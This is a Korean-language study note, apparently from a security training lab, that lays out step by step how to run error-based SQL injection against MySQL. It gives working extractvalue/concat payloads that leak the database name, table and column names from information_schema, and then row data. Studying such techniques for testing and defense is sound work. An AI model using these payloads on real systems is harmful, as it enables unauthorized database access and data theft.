# Error Based SQL Injection Process

### **Error Based SQL Injection Process**

1. **SQL Injection Point 찾기**
2. **에러 출력 함수 선택**
3. **공격 format 만들기**
4. **DB 이름 확인**
5. **Table 이름 확인**
6. **Column 이름 확인**
7. **Data 추출**

&#x20;

***

&#x20;

#### **1. SQL Injection Point 찾기**

&#x20;Syntax Error 여부 확인

&#x20;

#### **2. 에러 출력 함수 선택**

extractvalue

&#x20;

#### **3. 공격 format 만들기**

normaltic' and extractvalue('1', concat(0x3a, (select 'normaltic'))) and '1' ='1\
normaltic' and extractvalue('1', concat(0x3a, (            ))) and '1' ='1

&#x20;

#### **4. DB 이름 확인**

<mark style="color:red;">**select database()**</mark>

normaltic' and extractvalue('1', concat(0x3a, (select database()))) and '1' ='1



#### **5. Table 이름 확인**

select table\_name from information\_schema.tables where table\_schema='<mark style="color:blue;">**segfault\_sql**</mark>'

&#x20;

행이 여러개인 경우 limit를 사용한다.

&#x20;

첫번째 테이블 : select table\_name from information\_schema.tables where table\_schema='<mark style="color:blue;">**segfault\_sql**</mark>' limit 0,1

두번째 테이블 :&#x20;

select table\_name from information\_schema.tables where table\_schema='<mark style="color:blue;">**segfault\_sql**</mark>' limit 1,1

...



#### **6. Column 이름 확인**

select column\_name from information\_schema.columns where table\_name = '<mark style="color:blue;">**game**</mark>' limit 0,1

...



#### **7. Data 추출**

game 테이블에 있는 name 칼럼 출력 예시 :

normaltic' and extractvalue('1', concat(0x3a, (select <mark style="color:blue;">**name**</mark> from <mark style="color:blue;">**game**</mark> limit 0,1))) and '1' ='1

&#x20;
